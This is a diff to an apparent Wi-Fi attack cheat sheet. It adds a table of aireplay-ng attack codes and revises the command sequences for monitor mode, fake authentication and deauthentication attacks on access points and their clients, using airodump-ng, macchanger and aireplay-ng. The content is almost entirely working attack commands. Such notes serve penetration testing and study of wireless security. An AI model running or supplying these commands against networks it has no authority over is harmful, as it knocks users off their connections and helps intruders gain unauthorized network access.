@@ -1,3 +1,19 @@
+
+
+CODE	ATTACK NAME
+ 0	   Deauthentication
+ 1	   Fake Authentication
+ 2	   Interactive Packet Replay
+ 3	   ARP Request Replay Attack
+ 4	   KoreK ChopChop Attack
+ 5	   Fragmentation Attack
+ 6	   Café-Latte Attack
+ 7	   Client-Oriented Fragmentation Attack
+ 8	   WPA Migration Mode Attack
+ 9	   Injection Test
+
+
+
 # Monitor mode #
 
    airmon-ng start <interface> <Channel>
@@ -6,18 +22,19 @@
    iw dev <interface> set type monitor
    ip link <interface> up
    
+   
 ## Fake Authentication Attack
    
-
-   
-   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
-   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
+   airodump-ng -c <Channel> <interface> -w <captured_file>      
+   macchanger --show <interface>
+   aireplay-ng -1 <reassociation timing in seconds> -e <ESSID> -a <AP_MAC> -h <mac> <interface>     
+   #aireplay -1 0 -e testAP -a 13:06:19:94:00:00 -h 02:00:00:00:00:00 wlan0           
    
    
 ## Deauthentication Attack
 
-   airmon-ng start <interface> <AP_Channel>                                         ## setting the wireless card (wlan0) to monitor mode
-   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       ## listening to the target AP on the specified channel
+   airodump-ng -c <Channel> <interface> -w <captured_file>      
+   macchanger --show <interface>
    aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                         ## performing a deauthentication attack against AP
 
 
